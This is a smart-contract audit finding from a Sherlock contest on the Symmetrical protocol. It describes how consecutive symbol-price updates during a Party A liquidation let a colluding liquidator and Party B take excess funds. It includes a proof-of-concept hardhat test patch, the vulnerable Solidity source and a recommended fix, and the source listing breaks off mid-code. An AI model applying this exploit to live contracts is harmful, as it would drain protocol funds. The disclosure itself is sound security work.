{
  "Title": "M-21: Consecutive symbol price updates can be exploited to drain protocol funds",
  "Content": "# Issue M-21: Consecutive symbol price updates can be exploited to drain protocol funds \n\nSource: https://github.com/sherlock-audit/2023-06-symmetrical-judging/issues/291 \n\n## Found by \nberndartmueller\n## Summary\n\nRepeatedly updating the symbol prices for the symbols used in Party A's positions mid-way through a liquidation while maintaining the same Party A's UPnL and total unrealized losses leads to more profits for Party B and effectively steals funds from the protocol.\n\n## Vulnerability Detail\n\nThe `setSymbolsPrice` function in the `LiquidationFacetImpl` library is used to set the prices of symbols for Party A's positions. It is called by the liquidator, who supplies the `PriceSig memory priceSig` argument, which contains, among other values, the prices of the symbols as well as the `upnl` and `totalUnrealizedLoss` of Party A's positions.\n\nParty A's `upnl` and `totalUnrealizedLoss` values are [stored in Party A's liquidation details](https://github.com/sherlock-audit/2023-06-symmetrical/blob/main/symmio-core/contracts/facets/liquidation/LiquidationFacetImpl.sol#L59-L60) and enforced to remain the same for consecutive calls to `setSymbolsPrice` via the `require` statement in lines 90-95.\n\nHowever, as long as those two values remain the same, the liquidator can set the prices of the symbols to the current market prices (fetched by the Muon app). If a liquidator liquidates Party A's open positions in multiple calls to `liquidatePositionsPartyA` and updates symbol prices in between, Party B potentially receives more profits than they should have.\n\nThe git diff below contains a test case to demonstrate the following scenario:\n\nGiven the following symbols:\n\n1. `BTCUSDT`\n2. `AAVEUSDT`\n\nFor simplicity, we assume trading fees are 0.\n\nParty A's allocated balance: `100e18 USDT`\n\nParty A has two open positions with Party B:\n\n| ID  | Symbol   | Order Type | Position Type | Quantity | Price | Total Value | CVA   | LF    | MM  | Total Locked | Leverage |\n| --- | -------- | ---------- | ------------- | -------- | ----- | ----------- | ----- | ----- | --- | ------------ | -------- |\n| 1   | BTCUSDT  | LIMIT      | LONG          | 100e18   | 1e18  | 100e18      | 25e18 | 25e18 | 0   | 50e18        | 2        |\n| 2   | AAVEUSDT | LIMIT      | LONG          | 100e18   | 1e18  | 100e18      | 25e18 | 25e18 | 0   | 50e18        | 2        |\n\nParty A's available balance: 100e18 - 100e18 = 0 USDT\n\nNow, the price of `BTCUSDT` drops by 40% to `0.6e18 USDT`. Party A's `upnl` and `totalUnrealizedLoss` are now `-40e18 USDT` and `-40e18 USDT`, respectively.\n\nParty A is insolvent and gets liquidated.\n\nThe liquidator calls `setSymbolsPrice` for both symbols, setting the price of `BTCUSDT` to `0.6e18 USDT` and the price of `AAVEUSDT` to `1e18 USDT`. The `liquidationDetails` of Party A are as follows:\n\n- `liquidationType`: `LiquidationType.NORMAL`\n- `upnl`: `-40e18 USDT`\n- `totalUnrealizedLoss`: `-40e18 USDT`\n- `deficit`: 0\n- `liquidationFee`: `50e18 - 40e18 = 10e18 USDT`\n\nThe liquidator first liquidates position 1 -> Party B receives `40e18 USDT` + `25e18 USDT` (CVA) = `65e18 USDT`\n\nNow, due to a volatile market, the price of `AAVEUSDT` drops by 40% to `0.6e18 USDT`. The liquidator calls `setSymbolsPrice` again, setting the price of `AAVEUSDT` to `0.6e18 USDT`. `upnl` and `totalUnrealizedLoss` remain the same. Thus the symbol prices can be updated.\n\nThe liquidator liquidates position 2 -> Party B receives `40e18 USDT` + `25e18 USDT` (CVA) = `65e18 USDT`\n\nParty B received in total `65e18 + 65e18 = 130e18 USDT`, which is `30e18` USDT more than Party A's initially locked balances. Those funds are effectively stolen from the protocol and bad debt.\n\nConversely, if both positions had been liquidated in the first call without updating the symbol prices in between, Party B would have received `40e18 + 25e18 = 65e18 USDT`, which Party A's locked balances covered.\n\n<details>\n  <summary><strong>Git diff</strong></summary>\n\n```diff\ndiff --git a/symmio-core/test/Initialize.fixture.ts b/symmio-core/test/Initialize.fixture.ts\nindex 2df1e6f..cfe81c0 100644\n--- a/symmio-core/test/Initialize.fixture.ts\n+++ b/symmio-core/test/Initialize.fixture.ts\n@@ -45,7 +45,11 @@ export async function initializeFixture(): Promise<RunContext> {\n\n await context.controlFacet\n   .connect(context.signers.admin)\n-    .addSymbol(\"BTCUSDT\", decimal(5), decimal(1, 16), decimal(1, 16));\n+    .addSymbol(\"BTCUSDT\", decimal(5), decimal(1, 16), decimal(0));\n+\n+    await context.controlFacet\n+    .connect(context.signers.admin)\n+    .addSymbol(\"AAVEUSDT\", decimal(5), decimal(1, 16), decimal(0));\n\n await context.controlFacet.connect(context.signers.admin).setPendingQuotesValidLength(10);\n await context.controlFacet.connect(context.signers.admin).setLiquidatorShare(decimal(1, 17));\ndiff --git a/symmio-core/test/LiquidationFacet.behavior.ts b/symmio-core/test/LiquidationFacet.behavior.ts\nindex 2e06b92..08e40d2 100644\n--- a/symmio-core/test/LiquidationFacet.behavior.ts\n+++ b/symmio-core/test/LiquidationFacet.behavior.ts\n@@ -7,8 +7,10 @@ import { Hedger } from \"./models/Hedger\";\nimport { RunContext } from \"./models/RunContext\";\nimport { BalanceInfo, User } from \"./models/User\";\nimport { decimal, getTotalLockedValuesForQuoteIds, getTradingFeeForQuotes, liquidatePartyA } from \"./utils/Common\";\n-import { getDummySingleUpnlSig } from \"./utils/SignatureUtils\";\n+import { getDummyPriceSig, getDummySingleUpnlSig } from \"./utils/SignatureUtils\";\nimport hre from \"hardhat\";\n+import { limitQuoteRequestBuilder } from \"./models/requestModels/QuoteRequest\";\n+import { limitOpenRequestBuilder } from \"./models/requestModels/OpenRequest\";\n\nexport function shouldBehaveLikeLiquidationFacet(): void {\n beforeEach(async function() {\n@@ -16,7 +18,7 @@ export function shouldBehaveLikeLiquidationFacet(): void {\n\n   this.user = new User(this.context, this.context.signers.user);\n   await this.user.setup();\n-    await this.user.setBalances(decimal(2000), decimal(1000), decimal(500));\n+    await this.user.setBalances(decimal(2000), decimal(100), decimal(100));\n\n   this.user2 = new User(this.context, this.context.signers.user2);\n   await this.user2.setup();\n@@ -39,20 +41,26 @@ export function shouldBehaveLikeLiquidationFacet(): void {\n   await this.hedger.openPosition(1);\n\n   // Quote2 -> locked\n-    await this.user.sendQuote();\n+    await this.user.sendQuote(\n+      limitQuoteRequestBuilder()\n+        .symbolId(2)\n+        .build()\n+    );\n   await this.hedger.lockQuote(2);\n+    await this.hedger.openPosition(2,\n+      limitOpenRequestBuilder().price(decimal(1)).build());\n\n   // Quote3 -> sent\n-    await this.user.sendQuote();\n+    // await this.user.sendQuote();\n\n   // Quote4 -> user2 -> opened\n-    await this.user2.sendQuote();\n-    await this.hedger.lockQuote(4);\n-    await this.hedger.openPosition(4);\n+    // await this.user2.sendQuote();\n+    // await this.hedger.lockQuote(4);\n+    // await this.hedger.openPosition(4);\n\n   // Quote5 -> locked\n-    await this.user.sendQuote();\n-    await this.hedger.lockQuote(5);\n+    // await this.user.sendQuote();\n+    // await this.hedger.lockQuote(5);\n });\n\n describe(\"Liquidate PartyA\", async function() {\n@@ -116,16 +124,12 @@ export function shouldBehaveLikeLiquidationFacet(): void {\n   describe(\"Liquidate Positions\", async function() {\n     beforeEach(async function() {\n       const context: RunContext = this.context;\n-        await liquidatePartyA(\n-          context,\n-          context.signers.user.getAddress(),\n-        );\n-        await liquidatePartyA(\n-          context,\n-          context.signers.user2.getAddress(),\n-          context.signers.liquidator,\n-          decimal(-475),\n-        );\n+        // await liquidatePartyA(\n+        //   context,\n+        //   context.signers.user2.getAddress(),\n+        //   context.signers.liquidator,\n+        //   decimal(-475),\n+        // );\n     });\n\n     it(\"Should fail on invalid state\", async function() {\n@@ -179,6 +183,72 @@ export function shouldBehaveLikeLiquidationFacet(): void {\n       let balanceInfoOfLiquidator = await this.liquidator.getBalanceInfo();\n       expect(balanceInfoOfLiquidator.allocatedBalances).to.be.equal(decimal(1));\n     });\n+\n+      it.only(\"Should maliciously liquidate positions\", async function() {\n+        const context: RunContext = this.context;\n+        let user = context.signers.user.getAddress();\n+        let hedger = context.signers.hedger.getAddress();\n+\n+        expect(await context.viewFacet.allocatedBalanceOfPartyA(user)).to.be.equal(\n+          decimal(100),\n+        );\n+\n+        await liquidatePartyA(\n+          context,\n+          context.signers.user.getAddress(),\n+        );\n+\n+        await context.liquidationFacet\n+          .connect(context.signers.liquidator)\n+          .liquidatePendingPositionsPartyA(user);\n+\n+        expect(await context.viewFacet.allocatedBalanceOfPartyB(hedger, user)).to.be.equal(\n+          decimal(240),\n+        );\n+\n+        await context.liquidationFacet\n+          .connect(context.signers.liquidator)\n+          .liquidatePositionsPartyA(user, [1]);\n+\n+          expect((await context.viewFacet.isPartyALiquidated(user))).to.be.true;\n+\n+        expect((await context.viewFacet.getQuote(1)).quoteStatus).to.be.equal(\n+          QuoteStatus.LIQUIDATED,\n+        );\n+\n+        expect(await context.viewFacet.allocatedBalanceOfPartyB(hedger, user)).to.be.equal(\n+          decimal(240 + 65), // @audit-info 65 profit: 40 profit from position + 25 CVA\n+        );\n+\n+        expect(await context.viewFacet.allocatedBalanceOfPartyA(user)).to.be.equal(\n+          decimal(100), // @audit-info remains unchanged until the liquidation process is complete\n+        );\n+\n+        await context.liquidationFacet\n+          .connect(context.signers.liquidator)\n+          .setSymbolsPrice(\n+            user,\n+            await getDummyPriceSig([2], [decimal(6, 17)], decimal(-40), decimal(-40)), // @audit-info price of symbol #2 dropped by 40% (6e17) -> same UPnL and total loss\n+          );\n+\n+        await context.liquidationFacet\n+          .connect(context.signers.liquidator)\n+          .liquidatePositionsPartyA(user, [2]);\n+\n+        expect((await context.viewFacet.getQuote(2)).quoteStatus).to.be.equal(\n+          QuoteStatus.LIQUIDATED,\n+        );\n+\n+        expect((await context.viewFacet.isPartyALiquidated(user))).to.be.false;\n+\n+        expect(await context.viewFacet.allocatedBalanceOfPartyB(hedger, user)).to.be.equal(\n+          decimal(240 + 65 + 65), // @audit-info 130 profit in total: 80 profit from positions + 50 CVA\n+        );\n+\n+        expect(await context.viewFacet.allocatedBalanceOfPartyA(user)).to.be.equal(\n+          decimal(0),\n+        );\n+      });\n   });\n });\n\ndiff --git a/symmio-core/test/models/requestModels/QuoteRequest.ts b/symmio-core/test/models/requestModels/QuoteRequest.ts\nindex 833e181..82d45b9 100644\n--- a/symmio-core/test/models/requestModels/QuoteRequest.ts\n+++ b/symmio-core/test/models/requestModels/QuoteRequest.ts\n@@ -29,9 +29,9 @@ const limitDefaultQuoteRequest: QuoteRequest = {\n orderType: OrderType.LIMIT,\n price: decimal(1),\n quantity: decimal(100),\n-  cva: decimal(22),\n-  mm: decimal(75),\n-  lf: decimal(3),\n+  cva: decimal(25),\n+  mm: decimal(0),\n+  lf: decimal(25),\n maxInterestRate: 0,\n deadline: getBlockTimestamp(500),\n upnlSig: getDummySingleUpnlAndPriceSig(decimal(1)),\ndiff --git a/symmio-core/test/utils/Common.ts b/symmio-core/test/utils/Common.ts\nindex ed0c3c9..69f7ed5 100644\n--- a/symmio-core/test/utils/Common.ts\n+++ b/symmio-core/test/utils/Common.ts\n@@ -119,10 +119,10 @@ export async function liquidatePartyA(\n context: RunContext,\n liquidatedUser: Promise<string>,\n liquidator: SignerWithAddress = context.signers.liquidator,\n-  upnl: BigNumberish = decimal(-473),\n-  totalUnrealizedLoss: BigNumberish = 0,\n-  symbolIds: BigNumberish[] = [1],\n-  prices: BigNumberish[] = [decimal(1)],\n+  upnl: BigNumberish = decimal(-40),\n+  totalUnrealizedLoss: BigNumberish = decimal(-40),\n+  symbolIds: BigNumberish[] = [1, 2],\n+  prices: BigNumberish[] = [decimal(6, 17), decimal(1)],\n) {\n await context.liquidationFacet\n   .connect(liquidator)\n```\n\n</details>\n\n**How to run this test case:**\n\nSave git diff to a file named `exploit-liquidation.patch` and run with\n\n```bash\ngit apply exploit-liquidation.patch\nnpx hardhat test\n```\n\n## Impact\n\nA malicious liquidator can cooperate with Party B and by exploiting this issue during a volatile market, can cause Party B to receive more funds (profits, due to being the counterparty to Party A which faces losses) than it should and steal funds from the protocol.\n\n## Code Snippet\n\n[contracts/facets/liquidation/LiquidationFacetImpl.sol#L90-L95](https://github.com/sherlock-audit/2023-06-symmetrical/blob/main/symmio-core/contracts/facets/liquidation/LiquidationFacetImpl.sol#L90-L95)\n\n```solidity\n34: function setSymbolsPrice(address partyA, PriceSig memory priceSig) internal {\n35:     MAStorage.Layout storage maLayout = MAStorage.layout();\n36:     AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n37:\n38:     LibMuon.verifyPrices(priceSig, partyA);\n39:     require(maLayout.liquidationStatus[partyA], \"LiquidationFacet: PartyA is solvent\");\n40:     require(\n41:         priceSig.timestamp <=\n42:             maLayout.liquidationTimestamp[partyA] + maLayout.liquidationTimeout,\n43:         \"LiquidationFacet: Expired signature\"\n44:     );\n45:     for (uint256 index = 0; index < priceSig.symbolIds.length; index++) {\n46:         accountLayout.symbolsPrices[partyA][priceSig.symbolIds[index]] = Price(\n47:             priceSig.prices[index],\n48:             maLayout.liquidationTimestamp[partyA]\n49:         );\n50:     }\n51:\n52:     int256 availableBalance = LibAccount.partyAAvailableBalanceForLiquidation(\n53:         priceSig.upnl,\n54:         partyA\n55:     );\n56:     if (accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.NONE) {\n57:         accountLayout.liquidationDetails[partyA] = LiquidationDetail({\n58:             liquidationType: LiquidationType.NONE,\n59:             upnl: priceSig.upnl,\n60:             totalUnrealizedLoss: priceSig.totalUnrealizedLoss,\n61:             deficit: 0,\n62:             liquidationFee: 0\n63:         });\n...     // [...]\n89:     } else {\n90: @>      require(\n91: @>          accountLayout.liquidationDetails[partyA].upnl == priceSig.upnl &&\n92: @>              accountLayout.liquidationDetails[partyA].totalUnrealizedLoss ==\n93: @>              priceSig.totalUnrealizedLoss,\n94: @>          \"LiquidationFacet: Invalid upnl sig\"\n95: @>      );\n96:     }\n97: }\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider preventing the liquidator from updating symbol prices mid-way of a liquidation process.\n\nOr, alternatively, store the number of Party A's open positions in the `liquidationDetails` and only allow updating the symbol prices if the current number of open positions is still the same, effectively preventing the liquidator from updating the symbol prices once a position has been liquidated.\n\n\n\n\n## Discussion\n\n**MoonKnightDev**\n\nThe potential exploit you've mentioned hinges on the unlikely scenario that during the liquidation process, a party can provide a signature that exactly replicates the previous unrealized PnL and total unrealized loss. This is theoretically possible but practically near-impossible. Hence, we categorize this issue as medium risk.\n\n**ctf-sec**\n\nComment from senior watson:\n\nThe risk should be medium as it requires a number of conditions must be aligned for the issue to occur:\n\n1) The market must be volatile\n\n2) For this attack to succeed, the upnl and totalUnrealizedLoss of the second price update must be the same as the first one. Even if the price moves, it is difficult to obtain the same upnl and totalUnrealizedLoss for a second time from the oracle as it has to be accurate to the smaller decimal (1 wei).\n\n3) PartyA and PartyB must conspire. PartyB has to be whitelisted by the protocol team.\n\n**ctf-sec**\n\nAdjusted the risk to medium based on the comments above\n\n**MoonKnightDev**\n\nFixed code PR link:\nhttps://github.com/SYMM-IO/symmio-core/pull/22\n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/85",
  "Code": [
    {
      "filename": "symmio-core/contracts/facets/liquidation/LiquidationFacetImpl.sol",
      "content": "// SPDX-License-Identifier: SYMM-Core-Business-Source-License-1.1\n// This contract is licensed under the SYMM Core Business Source License 1.1\n// Copyright (c) 2023 Symmetry Labs AG\n// For more information, see https://docs.symm.io/legal-disclaimer/license\npragma solidity >=0.8.18;\n\nimport \"../../libraries/LibLockedValues.sol\";\nimport \"../../libraries/LibMuon.sol\";\nimport \"../../libraries/LibAccount.sol\";\nimport \"../../libraries/LibQuote.sol\";\nimport \"../../storages/MAStorage.sol\";\nimport \"../../storages/QuoteStorage.sol\";\nimport \"../../storages/MuonStorage.sol\";\nimport \"../../storages/AccountStorage.sol\";\nimport \"../../storages/SymbolStorage.sol\";\n\nlibrary LiquidationFacetImpl {\n    using LockedValuesOps for LockedValues;\n\n    function liquidatePartyA(address partyA, SingleUpnlSig memory upnlSig) internal {\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n\n        LibMuon.verifyPartyAUpnl(upnlSig, partyA);\n        int256 availableBalance = LibAccount.partyAAvailableBalanceForLiquidation(\n            upnlSig.upnl,\n            partyA\n        );\n        require(availableBalance < 0, \"LiquidationFacet: PartyA is solvent\");\n        maLayout.liquidationStatus[partyA] = true;\n        maLayout.liquidationTimestamp[partyA] = upnlSig.timestamp;\n        AccountStorage.layout().liquidators[partyA].push(msg.sender);\n    }\n\n    function setSymbolsPrice(address partyA, PriceSig memory priceSig) internal {\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n\n        LibMuon.verifyPrices(priceSig, partyA);\n        require(maLayout.liquidationStatus[partyA], \"LiquidationFacet: PartyA is solvent\");\n        require(\n            priceSig.timestamp <=\n                maLayout.liquidationTimestamp[partyA] + maLayout.liquidationTimeout,\n            \"LiquidationFacet: Expired signature\"\n        );\n        for (uint256 index = 0; index < priceSig.symbolIds.length; index++) {\n            accountLayout.symbolsPrices[partyA][priceSig.symbolIds[index]] = Price(\n                priceSig.prices[index],\n                maLayout.liquidationTimestamp[partyA]\n            );\n        }\n\n        int256 availableBalance = LibAccount.partyAAvailableBalanceForLiquidation(\n            priceSig.upnl,\n            partyA\n        );\n        if (accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.NONE) {\n            accountLayout.liquidationDetails[partyA] = LiquidationDetail({\n                liquidationType: LiquidationType.NONE,\n                upnl: priceSig.upnl,\n                totalUnrealizedLoss: priceSig.totalUnrealizedLoss,\n                deficit: 0,\n                liquidationFee: 0\n            });\n            if (availableBalance >= 0) {\n                uint256 remainingLf = accountLayout.lockedBalances[partyA].lf;\n                accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.NORMAL;\n                accountLayout.liquidationDetails[partyA].liquidationFee = remainingLf;\n            } else if (uint256(-availableBalance) < accountLayout.lockedBalances[partyA].lf) {\n                uint256 remainingLf = accountLayout.lockedBalances[partyA].lf -\n                    uint256(-availableBalance);\n                accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.NORMAL;\n                accountLayout.liquidationDetails[partyA].liquidationFee = remainingLf;\n            } else if (\n                uint256(-availableBalance) <=\n                accountLayout.lockedBalances[partyA].lf + accountLayout.lockedBalances[partyA].cva\n            ) {\n                uint256 deficit = uint256(-availableBalance) -\n                    accountLayout.lockedBalances[partyA].lf;\n                accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.LATE;\n                accountLayout.liquidationDetails[partyA].deficit = deficit;\n            } else {\n                uint256 deficit = uint256(-availableBalance) -\n                    accountLayout.lockedBalances[partyA].lf -\n                    accountLayout.lockedBalances[partyA].cva;\n                accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.OVERDUE;\n                accountLayout.liquidationDetails[partyA].deficit = deficit;\n            }\n            AccountStorage.layout().liquidators[partyA].push(msg.sender);\n        } else {\n            require(\n                accountLayout.liquidationDetails[partyA].upnl == priceSig.upnl &&\n                    accountLayout.liquidationDetails[partyA].totalUnrealizedLoss ==\n                    priceSig.totalUnrealizedLoss,\n                \"LiquidationFacet: Invalid upnl sig\"\n            );\n        }\n    }\n\n    function liquidatePendingPositionsPartyA(address partyA) internal {\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n        require(\n            MAStorage.layout().liquidationStatus[partyA],\n            \"LiquidationFacet: PartyA is solvent\"\n        );\n        for (uint256 index = 0; index < quoteLayout.partyAPendingQuotes[partyA].length; index++) {\n            Quote storage quote = quoteLayout.quotes[\n                quoteLayout.partyAPendingQuotes[partyA][index]\n            ];\n            if (\n                (quote.quoteStatus == QuoteStatus.LOCKED ||\n                    quote.quoteStatus == QuoteStatus.CANCEL_PENDING) &&\n                quoteLayout.partyBPendingQuotes[quote.partyB][partyA].length > 0\n            ) {\n                delete quoteLayout.partyBPendingQuotes[quote.partyB][partyA];\n                AccountStorage\n                .layout()\n                .partyBPendingLockedBalances[quote.partyB][partyA].makeZero();\n            }\n            quote.quoteStatus = QuoteStatus.LIQUIDATED;\n            quote.modifyTimestamp = block.timestamp;\n        }\n        AccountStorage.layout().pendingLockedBalances[partyA].makeZero();\n        delete quoteLayout.partyAPendingQuotes[partyA];\n    }\n\n    function liquidatePositionsPartyA(\n        address partyA,\n        uint256[] memory quoteIds\n    ) internal returns (bool) {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n\n        require(maLayout.liquidationStatus[partyA], \"LiquidationFacet: PartyA is solvent\");\n        for (uint256 index = 0; index < quoteIds.length; index++) {\n            Quote storage quote = quoteLayout.quotes[quoteIds[index]];\n            require(\n                quote.quoteStatus == QuoteStatus.OPENED ||\n                    quote.quoteStatus == QuoteStatus.CLOSE_PENDING ||\n                    quote.quoteStatus == QuoteStatus.CANCEL_CLOSE_PENDING,\n                \"LiquidationFacet: Invalid state\"\n            );\n            require(quote.partyA == partyA, \"LiquidationFacet: Invalid party\");\n            require(\n                accountLayout.symbolsPrices[partyA][quote.symbolId].timestamp ==\n                    maLayout.liquidationTimestamp[partyA],\n                \"LiquidationFacet: Price should be set\"\n            );\n            quote.quoteStatus = QuoteStatus.LIQUIDATED;\n            quote.modifyTimestamp = block.timestamp;\n\n            (bool hasMadeProfit, uint256 amount) = LibQuote.getValueOfQuoteForPartyA(\n                accountLayout.symbolsPrices[partyA][quote.symbolId].price,\n                LibQuote.quoteOpenAmount(quote),\n                quote\n            );\n            if (hasMadeProfit) {\n                accountLayout.totalUnplForLiquidation[partyA] += int256(amount);\n            } else {\n                accountLayout.totalUnplForLiquidation[partyA] -= int256(amount);\n            }\n\n            if (\n                accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.NORMAL\n            ) {\n                accountLayout.partyBAllocatedBalances[quote.partyB][partyA] += quote\n                    .lockedValues\n                    .cva;\n                if (hasMadeProfit) {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] -= amount;\n                } else {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] += amount;\n                }\n            } else if (\n                accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.LATE\n            ) {\n                accountLayout.partyBAllocatedBalances[quote.partyB][partyA] +=\n                    quote.lockedValues.cva -\n                    ((quote.lockedValues.cva * accountLayout.liquidationDetails[partyA].deficit) /\n                        accountLayout.lockedBalances[partyA].cva);\n                if (hasMadeProfit) {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] -= amount;\n                } else {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] += amount;\n                }\n            } else if (\n                accountLayout.liquidationDetails[partyA].liquidationType == LiquidationType.OVERDUE\n            ) {\n                if (hasMadeProfit) {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] -= amount;\n                } else {\n                    accountLayout.partyBAllocatedBalances[quote.partyB][partyA] +=\n                        amount -\n                        ((amount * accountLayout.liquidationDetails[partyA].deficit) /\n                            uint256(-accountLayout.liquidationDetails[partyA].totalUnrealizedLoss));\n                }\n            }\n            accountLayout.partyBLockedBalances[quote.partyB][partyA].subQuote(quote);\n            quote.avgClosedPrice =\n                (quote.avgClosedPrice *\n                    quote.closedAmount +\n                    LibQuote.quoteOpenAmount(quote) *\n                    accountLayout.symbolsPrices[partyA][quote.symbolId].price) /\n                (quote.closedAmount + LibQuote.quoteOpenAmount(quote));\n            quote.closedAmount = quote.quantity;\n\n            LibQuote.removeFromOpenPositions(quote.id);\n            quoteLayout.partyAPositionsCount[partyA] -= 1;\n            quoteLayout.partyBPositionsCount[quote.partyB][partyA] -= 1;\n        }\n        if (quoteLayout.partyAPositionsCount[partyA] == 0) {\n            require(\n                quoteLayout.partyAPendingQuotes[partyA].length == 0,\n                \"LiquidationFacet: Pending quotes should be liquidated first\"\n            );\n            accountLayout.allocatedBalances[partyA] = 0;\n            accountLayout.lockedBalances[partyA].makeZero();\n\n            uint256 lf = accountLayout.liquidationDetails[partyA].liquidationFee;\n            if (lf > 0) {\n                accountLayout.allocatedBalances[accountLayout.liquidators[partyA][0]] += lf / 2;\n                accountLayout.allocatedBalances[accountLayout.liquidators[partyA][1]] += lf / 2;\n            }\n            delete accountLayout.liquidators[partyA];\n            maLayout.liquidationStatus[partyA] = false;\n            maLayout.liquidationTimestamp[partyA] = 0;\n            accountLayout.liquidationDetails[partyA].liquidationType = LiquidationType.NONE;\n            if (\n                accountLayout.totalUnplForLiquidation[partyA] !=\n                accountLayout.liquidationDetails[partyA].upnl\n            ) {\n                accountLayout.totalUnplForLiquidation[partyA] = 0;\n                return false;\n            }\n            accountLayout.totalUnplForLiquidation[partyA] = 0;\n        }\n        return true;\n    }\n\n    function liquidatePartyB(\n        address partyB,\n        address partyA,\n        SingleUpnlSig memory upnlSig\n    ) internal {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n\n        LibMuon.verifyPartyBUpnl(upnlSig, partyB, partyA);\n        int256 availableBalance = LibAccount.partyBAvailableBalanceForLiquidation(\n            upnlSig.upnl,\n            partyB,\n            partyA\n        );\n\n        require(availableBalance < 0, \"LiquidationFacet: partyB is solvent\");\n        uint256 liquidatorShare;\n        uint256 remainingLf;\n        if (uint256(-availableBalance) < accountLayout.partyBLockedBalances[partyB][partyA].lf) {\n            remainingLf =\n                accountLayout.partyBLockedBalances[partyB][partyA].lf -\n                uint256(-availableBalance);\n            liquidatorShare = (remainingLf * maLayout.liquidatorShare) / 1e18;\n\n            maLayout.partyBPositionLiquidatorsShare[partyB][partyA] =\n                (remainingLf - liquidatorShare) /\n                quoteLayout.partyBPositionsCount[partyB][partyA];\n        } else {\n            maLayout.partyBPositionLiquidatorsShare[partyB][partyA] = 0;\n        }\n\n        maLayout.partyBLiquidationStatus[partyB][partyA] = true;\n        maLayout.partyBLiquidationTimestamp[partyB][partyA] = upnlSig.timestamp;\n\n        uint256[] storage pendingQuotes = quoteLayout.partyAPendingQuotes[partyA];\n\n        for (uint256 index = 0; index < pendingQuotes.length; ) {\n            Quote storage quote = quoteLayout.quotes[pendingQuotes[index]];\n            if (\n                quote.partyB == partyB &&\n                (quote.quoteStatus == QuoteStatus.LOCKED ||\n                    quote.quoteStatus == QuoteStatus.CANCEL_PENDING)\n            ) {\n                accountLayout.pendingLockedBalances[partyA].subQuote(quote);\n\n                pendingQuotes[index] = pendingQuotes[pendingQuotes.length - 1];\n                pendingQuotes.pop();\n                quote.quoteStatus = QuoteStatus.LIQUIDATED;\n                quote.modifyTimestamp = block.timestamp;\n            } else {\n                index++;\n            }\n        }\n        accountLayout.allocatedBalances[partyA] +=\n            accountLayout.partyBAllocatedBalances[partyB][partyA] -\n            remainingLf;\n\n        delete quoteLayout.partyBPendingQuotes[partyB][partyA];\n        accountLayout.partyBAllocatedBalances[partyB][partyA] = 0;\n        accountLayout.partyBLockedBalances[partyB][partyA].makeZero();\n        accountLayout.partyBPendingLockedBalances[partyB][partyA].makeZero();\n\n        if (liquidatorShare > 0) {\n            accountLayout.allocatedBalances[msg.sender] += liquidatorShare;\n        }\n    }\n\n    function liquidatePositionsPartyB(\n        address partyB,\n        address partyA,\n        QuotePriceSig memory priceSig\n    ) internal {\n        AccountStorage.Layout storage accountLayout = AccountStorage.layout();\n        MAStorage.Layout storage maLayout = MAStorage.layout();\n        QuoteStorage.Layout storage quoteLayout = QuoteStorage.layout();\n\n        LibMuon.verifyQuotePrices(priceSig);\n        require(\n            priceSig.timestamp <=\n                maLayout.partyBLiquidationTimestamp[partyB][partyA] + maLayout.liquidationTimeout,\n            \"LiquidationFacet: Expired signature\"\n        );\n        require(\n            maLayout.partyBLiquidationStatus[partyB][partyA],\n            \"LiquidationFacet: PartyB is solvent\"\n        );\n        require(\n            block.timestamp <= priceSig.timestamp + maLayout.liquidationTimeout,\n            \"LiquidationFacet: Expired price sig\"\n        );\n        for (uint256 index = 0; index < priceSig.quoteIds.length; index++) {\n            Quote storage quote = quoteLayout.quotes[priceSig.quoteIds[index]];\n            require(\n                quote.quoteStatus == QuoteStatus.OPENED ||\n                    quote.quoteStatus == QuoteStatus.CLOSE_PENDING ||\n                    quote.quoteStatus == QuoteStatus.CANCEL_CLOSE_PENDING,\n                \"LiquidationFacet: Invalid state\"\n            );\n            require(\n                quote.partyA == partyA && quote.partyB == partyB,\n                \"LiquidationFacet: Invalid party\"\n            );\n\n            quote.quoteStatus = QuoteStatus.LIQUIDATED;\n            quote.modifyTimestamp = block.timestamp;\n\n            // accountLayout.allocatedBalances[partyA] += quote.lockedValues.cva;\n            accountLayout.lockedBalances[partyA].subQuote(quote);\n\n            // (bool hasMadeProfit, uint256 amount) = LibQuote.getValueOfQuoteForPartyA(\n            //     priceSig.prices[index],\n            //     LibQuote.quoteOpenAmount(quote),\n            //     quote\n            // );\n\n            // if (hasMadeProfit) {\n            //     accountLayout.allocatedBalances[partyA] += amount;\n            // } else {\n            //     accountLayout.allocatedBalances[partyA] -= amount;\n            // }\n            quote.avgClosedPrice =\n                (quote.avgClosedPrice *\n                    quote.closedAmount +\n                    LibQuote.quoteOpenAmount(quote) *\n                    priceSig.prices[index]) /\n                (quote.closedAmount + LibQuote.quoteOpenAmount(quote));\n            quote.closedAmount = quote.quantity;\n\n            LibQuote.removeFromOpenPositions(quote.id);\n            quoteLayout.partyAPositionsCount[partyA] -= 1;\n            quoteLayout.partyBPositionsCount[partyB][partyA] -= 1;\n        }\n        if (maLayout.partyBPositionLiquidatorsShare[partyB][partyA] > 0) {\n            accountLayout.allocatedBalances[msg.sender] +=\n                maLayout.partyBPositionLiquidatorsShare[partyB][partyA] *\n                